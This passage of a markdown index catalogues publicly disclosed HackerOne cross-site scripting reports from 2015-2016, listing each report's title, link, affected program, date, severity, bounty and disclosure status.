| CONT-051 | [[careers.informatica.com] Cross Site Script Vulnerability on informatica](https://hackerone.com/reports/42537) | Informatica | 2015-01-05T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-052 | [XSS on Vimeo](https://hackerone.com/reports/45484) | Vimeo | 2015-01-28T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-053 | [XSS in Search Communities Function](https://hackerone.com/reports/47235) | Informatica | 2015-02-09T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-054 | [Vulnerability type xss uncovered in airbnb.es](https://hackerone.com/reports/49513) | Airbnb | 2015-02-27T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-055 | [XSS in original referrer after follow](https://hackerone.com/reports/50134) | Twitter | 2015-03-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-056 | [XSS with Time-of-Day Format](https://hackerone.com/reports/52822) | Phabricator | 2015-03-20T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-057 | [XSS in twitter.com/safety/unsafe_link_warning](https://hackerone.com/reports/53098) | Twitter | 2015-03-23T00:00:00 | Not disclosed in the source | $1,400 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-058 | [Xss in website's link](https://hackerone.com/reports/54321) | Shopify | 2015-04-02T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-059 | [XSS - URL Redirects](https://hackerone.com/reports/56662) | Shopify | 2015-04-16T00:00:00 | none | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-060 | [XSS on support.shopify.com](https://hackerone.com/reports/56760) | Shopify | 2015-04-16T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-061 | [XSS on ecommerce.shopify.com](https://hackerone.com/reports/56779) | Shopify | 2015-04-16T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-062 | [XSS in experts.shopify.com](https://hackerone.com/reports/57459) | Shopify | 2015-04-20T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-063 | [xss profile](https://hackerone.com/reports/60016) | Udemy | 2015-05-07T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-064 | [XSS Vulnerability on all pages](https://hackerone.com/reports/60201) | Mobile Vikings | 2015-05-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-065 | [xss on autoserch](https://hackerone.com/reports/61367) | Udemy | 2015-05-12T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-066 | [Multiple XSS Vulnerabilities in Concrete5 5.7.3.1](https://hackerone.com/reports/62294) | concrete5 | 2015-05-13T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-067 | [XSS in myshopify.com Admin site in TAX Overrides](https://hackerone.com/reports/62427) | Shopify | 2015-05-14T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-068 | [Bulk Discount App in myshopify.com exposes http://bulkdiscounts.shopifyapps.com vulnerable to XSS](https://hackerone.com/reports/62861) | Shopify | 2015-05-18T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-069 | [XSS in https://app.mavenlink.com/workspaces/](https://hackerone.com/reports/63537) | Mavenlink | 2015-05-23T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-070 | [Cross site scripting](https://hackerone.com/reports/63888) | Romit | 2015-05-27T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-071 | [XSS on added name album on videos.](https://hackerone.com/reports/65324) | VK.com | 2015-06-01T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-072 | [XSS at importing Product List](https://hackerone.com/reports/67125) | Shopify | 2015-06-10T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-073 | [XSS at Bulk editing products](https://hackerone.com/reports/67132) | Shopify | 2015-06-10T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-074 | [XSS in Myshopify Admin Site in DISCOUNTS](https://hackerone.com/reports/71614) | Shopify | 2015-06-19T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-075 | [XSS at Bulk editing ProductVariants](https://hackerone.com/reports/72331) | Shopify | 2015-06-24T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-076 | [Xss via Dropbox](https://hackerone.com/reports/72526) | ThisData | 2015-06-25T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-077 | [XSS - Gallery Search Listing](https://hackerone.com/reports/76713) | Zaption | 2015-07-19T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-078 | [Cross site scripting On api Calculator API requests](https://hackerone.com/reports/78003) | ok.ru | 2015-07-23T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-079 | [xss in group](https://hackerone.com/reports/78052) | ok.ru | 2015-07-23T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-080 | [Potential XSS on sanitize/Rails::Html::WhiteListSanitizer](https://hackerone.com/reports/81212) | Ruby on Rails | 2015-08-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-081 | [XSS https://delivery.shopifyapps.com/ (Digital Downloads App in myshopify.com)](https://hackerone.com/reports/81441) | Shopify | 2015-08-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-082 | [XSS in WordPress](https://hackerone.com/reports/81736) | Automattic | 2015-08-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-083 | [XSS https://www.shopify.com/signup](https://hackerone.com/reports/85291) | Shopify | 2015-08-27T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-084 | [apps.owncloud.com: Potential XSS](https://hackerone.com/reports/85577) | ownCloud | 2015-08-29T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-085 | [XSS on OAuth authorize/authenticate endpoint](https://hackerone.com/reports/87040) | Twitter | 2015-09-02T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-086 | [www.shopify.com XSS on blog pages via sharing buttons](https://hackerone.com/reports/87168) | Shopify | 2015-09-03T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-087 | [XSS Vulnerability](https://hackerone.com/reports/87588) | Udemy | 2015-09-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-088 | [XSS on vimeo.com/home after other user follows you](https://hackerone.com/reports/87854) | Vimeo | 2015-09-07T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-089 | [XSS on mobile version of vimeo.com where the button "Follow" appears](https://hackerone.com/reports/88088) | Vimeo | 2015-09-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-090 | [XSS by image file name](https://hackerone.com/reports/93807) | FanFootage | 2015-10-14T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-091 | [XSS in the "Poll" Feature on Twitter.com](https://hackerone.com/reports/95231) | Twitter | 2015-10-22T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-092 | [Cross Site Scripting](https://hackerone.com/reports/95599) | Binary.com | 2015-10-24T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-093 | [XSS on player.vimeo.com without user interaction and vimeo.com with user interaction](https://hackerone.com/reports/96229) | Vimeo | 2015-10-27T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-094 | [XSS m.imgur.com](https://hackerone.com/reports/97938) | Imgur | 2015-11-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-095 | [XSS in L.mapbox.shareControl in mapbox.js](https://hackerone.com/reports/99245) | Mapbox | 2015-11-12T00:00:00 | Not disclosed in the source | $1,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-096 | [an xss issue](https://hackerone.com/reports/99368) | Algolia | 2015-11-12T00:00:00 | Not disclosed in the source | $100 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-097 | [XSS in creating tweets](https://hackerone.com/reports/101450) | Shopify | 2015-11-24T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-098 | [shopifyapps.com XSS on sales channels via currency formatting](https://hackerone.com/reports/104359) | Shopify | 2015-12-09T00:00:00 | Not disclosed in the source | $1,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-099 | [XSS on codex.wordpress.org](https://hackerone.com/reports/104559) | Automattic | 2015-12-10T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-100 | [many xss in widgets.shopifyapps.com](https://hackerone.com/reports/105659) | Shopify | 2015-12-16T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-101 | [Strored Cross Site Scripting](https://hackerone.com/reports/106636) | Shopify | 2015-12-23T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-102 | [XSS in imgur mobile](https://hackerone.com/reports/106982) | Imgur | 2015-12-26T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-103 | [XSS in imgur mobile 3](https://hackerone.com/reports/107036) | Imgur | 2015-12-27T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-104 | [XSS in GM](https://hackerone.com/reports/109352) | General Motors | 2016-01-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-105 | [refelected Xss on https://gmid.gm.com/gmid/jsp/GMIDInitialLogin.jsp](https://hackerone.com/reports/109461) | General Motors | 2016-01-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-106 | [XSS](https://hackerone.com/reports/111131) | Binary.com | 2016-01-16T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-107 | [www.shopify.com XSS via third-party script](https://hackerone.com/reports/111475) | Shopify | 2016-01-18T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-108 | [XSS at wordpress.com](https://hackerone.com/reports/111500) | Automattic | 2016-01-19T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-109 | [XSS vulnerability in "/coach/roster/" ( create your first class)](https://hackerone.com/reports/111763) | Khan Academy | 2016-01-20T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-110 | [XSS on gmchat.gm.com](https://hackerone.com/reports/112001) | General Motors | 2016-01-21T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-111 | [Cross Site Scripting - type Patameter](https://hackerone.com/reports/114151) | Zomato | 2016-02-02T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-112 | [Several XSS affecting Zomato.com and developers.zomato.com](https://hackerone.com/reports/114631) | Zomato | 2016-02-04T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-113 | [XSS and CSRF in Zomato Contact form](https://hackerone.com/reports/115248) | Zomato | 2016-02-07T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-114 | [Cross-Site Scripting Vulnerability in urbandictionary.com](https://hackerone.com/reports/115438) | Urban Dictionary | 2016-02-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-115 | [Two XSS vulns in widget parameters (all_collections.php and o2.php)](https://hackerone.com/reports/115560) | Zomato | 2016-02-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-116 | [XSS on hardware.shopify.com](https://hackerone.com/reports/116006) | Shopify | 2016-02-11T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-117 | [an xss issue in https://hunter22.slack.com/help/requests/793043](https://hackerone.com/reports/116419) | Slack | 2016-02-14T00:00:00 | Not disclosed in the source | $100 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-118 | [XSS @ love.uber.com](https://hackerone.com/reports/117068) | Uber | 2016-02-18T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-119 | [XSS in Draft Orders in Timeline i SHOPIFY Admin Site!](https://hackerone.com/reports/117449) | Shopify | 2016-02-19T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-120 | [xss in the all widgets of shopifyapps.com](https://hackerone.com/reports/119250) | Shopify | 2016-02-28T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-121 | [XSS Vulnerability in developer.gm.com](https://hackerone.com/reports/120683) | General Motors | 2016-03-04T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-122 | [XSS on hardware.shopify.com](https://hackerone.com/reports/123125) | Shopify | 2016-03-15T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-123 | [Possible XSS](https://hackerone.com/reports/123278) | HackerOne | 2016-03-15T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-124 | [XSS via React element spoofing](https://hackerone.com/reports/124277) | Imgur | 2016-03-18T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-125 | [Cross-site Scripting (XSS) autocomplete generation in https://www.uber.com/](https://hackerone.com/reports/124975) | Uber | 2016-03-22T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-126 | [XSS in getrush.uber.com](https://hackerone.com/reports/125112) | Uber | 2016-03-22T00:00:00 | Not disclosed in the source | $3,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-127 | [XSS on love.uber.com](https://hackerone.com/reports/125179) | Uber | 2016-03-22T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-128 | [Cross-site Scripting (XSS)](https://hackerone.com/reports/126049) | Uber | 2016-03-25T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-129 | [XSS In archive.uber.com Due to Mime Sniffing in IE](https://hackerone.com/reports/126197) | Uber | 2016-03-26T00:00:00 | Not disclosed in the source | $750 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-130 | [XSS using javascript:alert(8007)](https://hackerone.com/reports/127154) | Twitter | 2016-03-31T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-131 | [doc.owncloud.org: X-XSS-Protection not enabled](https://hackerone.com/reports/128493) | ownCloud | 2016-04-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-132 | [xss in DM group name in twitter](https://hackerone.com/reports/129436) | Twitter | 2016-04-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-133 | [Cross site scripting in apps.owncloud.com](https://hackerone.com/reports/129551) | ownCloud | 2016-04-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-134 | [XSS in uber oauth](https://hackerone.com/reports/131052) | Uber | 2016-04-15T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-135 | [XSS via password recovering](https://hackerone.com/reports/131123) | Uber | 2016-04-15T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-136 | [XSS in Asset name](https://hackerone.com/reports/133744) | Veris | 2016-04-22T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-137 | [XSS on www.wordpress.com](https://hackerone.com/reports/133963) | Automattic | 2016-04-23T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-138 | [[XSS] sandbox.veris.in](https://hackerone.com/reports/137119) | Veris | 2016-05-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-139 | [Xss in m.ok.ru](https://hackerone.com/reports/137126) | ok.ru | 2016-05-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-140 | [XSS onmouseover](https://hackerone.com/reports/139981) | Zomato | 2016-05-20T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-141 | [XSS in people.uber.com](https://hackerone.com/reports/140791) | Uber | 2016-05-24T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-142 | [XSS in Blog](https://hackerone.com/reports/141728) | drchrono | 2016-05-28T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-143 | [IE search XSS](https://hackerone.com/reports/142078) | General Motors | 2016-05-30T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-144 | [xss vulnerability in http://ubermovement.com/community/daniel](https://hackerone.com/reports/142946) | Uber | 2016-06-03T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-145 | [XSS on www.mapbox.com/authorize](https://hackerone.com/reports/143220) | Mapbox | 2016-06-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-146 | [XSS on www.mapbox.com/authorize/ because of open redirect at /core/oauth/auth](https://hackerone.com/reports/143240) | Mapbox | 2016-06-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-147 | [XSS on zomato.com](https://hackerone.com/reports/143294) | Zomato | 2016-06-06T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-148 | [xss in https://www.uber.com](https://hackerone.com/reports/145278) | Uber | 2016-06-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-149 | [Cross Site Scripting(XSS) on IRCCloud Badges Page (using Parameter Pollution)](https://hackerone.com/reports/150083) | IRCCloud | 2016-07-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-150 | [csp bypass + xss](https://hackerone.com/reports/153666) | Twitter | 2016-07-25T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-151 | [xss for admin of https://newsletter.nextcloud.com](https://hackerone.com/reports/153799) | Nextcloud | 2016-07-25T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-152 | [[forum.owncloud.org] IE, Edge XSS via Request-URI](https://hackerone.com/reports/154319) | ownCloud | 2016-07-27T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-153 | [[github.algolia.com] XSS](https://hackerone.com/reports/155576) | Algolia | 2016-07-31T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-154 | [XSS At "pages.et.uber.com"](https://hackerone.com/reports/156098) | Uber | 2016-08-02T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
